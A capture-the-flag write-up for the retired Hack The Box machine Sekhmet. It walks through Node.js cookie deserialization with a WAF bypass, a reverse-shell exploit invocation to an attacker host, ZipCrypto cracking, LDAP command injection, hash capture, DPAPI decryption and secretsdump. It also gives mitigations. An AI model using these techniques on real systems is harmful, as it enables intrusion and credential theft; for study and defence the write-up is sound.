---
machine: Sekhmet
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, ad, nodejs, deserialization, dpapi, rbcd]
---

# Sekhmet — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The Node.js session cookie is deserialized with `node-serialize`; the WAF blocks `_$$ND_FUNC$$_`, but Unicode escapes bypass it. The shell lands on an AD-joined Linux server. A ZipCrypto backup is broken with `bkcrack`, the LDAP `mobile` attribute injects commands and `scriptrunner` yields a Net-NTLMv2 hash. `Bob.Wood` and DPAPI lead to a domain administrative account.

## Recon

```bash
nmap -Pn -sCV -p22,80,88,139,389,445,464,636,3268,3269 <IP>
```

- `80/tcp` serves a Node.js application; `22/tcp` is an AD-joined Linux host.
- `88/389/445/464/636` confirm a `sekhmet.htb` DC.
- The application uses `express-session` cookies behind a WAF.

## Enumeration

- The `session` cookie is JSON serialized with `node-serialize`.
- The WAF blocks literal `_$$ND_FUNC$$_` but accepts `$$ND_FUNC$$`.
- The Linux host uses `sssd` against AD and shares `/opt/backup` over SMB.

## Foothold

Forge a cookie with a `child_process.exec` function and send it with Unicode escapes. The server deserializes it and runs the command as the service user.

```bash
python3 exploit.py --url http://<IP> --lhost <ATTACKER> --lport 443
# Cookie: {"rce":"_$$ND_FUNC$$function(){...}()"}
```

## Lateral movement

The ZipCrypto backup is broken with `bkcrack` using a known file and reveals credentials. LDAP access allows modifying a user's `mobile` attribute; a scheduled script uses it in a command, enabling injection. `scriptrunner` forces a service account to authenticate and yields its Net-NTLMv2 hash, cracked to obtain `Bob.Wood`.

## Privilege escalation

`Bob.Wood` has host access and Edge DPAPI credentials. Decrypt them with `dpapi.py` and recover an administrative account's password. That account enables DCSync or direct DC access to read the root flag.

```bash
DonPAPI.py sekhmet.htb/Bob.Wood:<PASSWORD>@<IP>
# Decrypt the Edge blob and reuse the administrative credential
secretsdump.py sekhmet.htb/<ADMIN>:<PASSWORD>@<DC>
```

## Evidence

- Cookie with `_$$ND_FUNC$$` accepted by the WAF.
- Backup decrypted with `bkcrack` and modified `mobile` attribute.
- `Bob.Wood` hash, DPAPI blob and administrative credential.

## Lessons learned

- A WAF blocking only literal strings is bypassed with escapes.
- Cookie deserialization in Node.js is remote execution.
- ZipCrypto does not protect a backup and LDAP attributes can be injection vectors.

## Mitigation and detection

- Do not deserialize cookies; sign and validate sessions with a server-side store.
- Use strong encryption for backups and restrict read access.
- Validate LDAP attributes before using them in commands and protect service accounts.

## References

- [0xdf — Sekhmet](https://0xdf.gitlab.io/2023/04/01/htb-sekhmet.html)
- [IppSec — Sekhmet](https://www.youtube.com/watch?v=vsgPsMZx59w)
- [Hack The Box — Sekhmet](https://app.hackthebox.com/machines/sekhmet)
